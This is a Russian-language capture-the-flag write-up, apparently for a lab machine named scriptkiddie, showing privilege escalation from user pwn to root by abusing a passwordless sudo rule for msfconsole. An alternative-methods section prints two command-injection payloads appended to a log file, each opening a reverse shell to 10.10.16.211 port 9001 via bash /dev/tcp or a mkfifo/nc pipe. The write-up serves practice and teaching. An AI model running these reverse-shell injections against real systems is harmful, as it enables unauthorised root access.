# Shell as pwn -> Root

Первыми проверил свои группы и права sudo:

```bash
pwn@scriptkiddie:~$ id
id
uid=1001(pwn) gid=1001(pwn) groups=1001(pwn)
pwn@scriptkiddie:~$ sudo -l
sudo -l
Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
```

Что мы знаем? В очень типичном стиле мы можем запускать metasploit с root-правами!

Мы *могли* использовать это для запуска апk-эксплойта с root-правами, но это не весело — мы уже использовали это дважды.

Вместо этого мы можем использовать встроенный shell metasploit для выполнения команд. Я выполнил `sudo msfconsole -q` (флаг `-q` необязателен) и затем просто ввёл `/bin/bash`, чтобы получить root-сhell :)

![[Pasted image 20210612161953.png]]

Вот и всё!

## Примечания по альтернативным методам

Простой способ «прошивать» команду `cut` (благодаря ippsec) заключался в соответствии правильному формату файла лога, вставляя две строки случайных данных перед командой:

```bash
kid@scriptkiddie:~/logs$ echo 'whatever whatever ;/bin/bash -c "bash -i >& /dev/tcp/10.10.16.211/9001 0>&1"' >> hackers
```

Это даёт нам еще один нестабильный shell, который сразу падает:

![[Pasted image 20210612163258.png]]

Хорошая альтернативная payload (благодаря коллеге) была бы:

```bash
kid@scriptkiddie:~/logs$ echo 'whatever whatever ;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.211 9001 >/tmp/f' >> hackers
```

Это даёт нам shell, который не падает сразу — но он также не передаёт никаких команд.

![[Pasted image 20210612163616.png]]

![[Pasted image 20210612163639.png]]

Мне было бы интересно увидеть, есть ли хороший способ получить стабильный shell таким образом. Мне также было бы интересно увидеть, есть ли хороший способ эксплуатировать командную инъекцию в поле `searchsploit`, которая частично работала ранее, но я не смог её запустить сам.
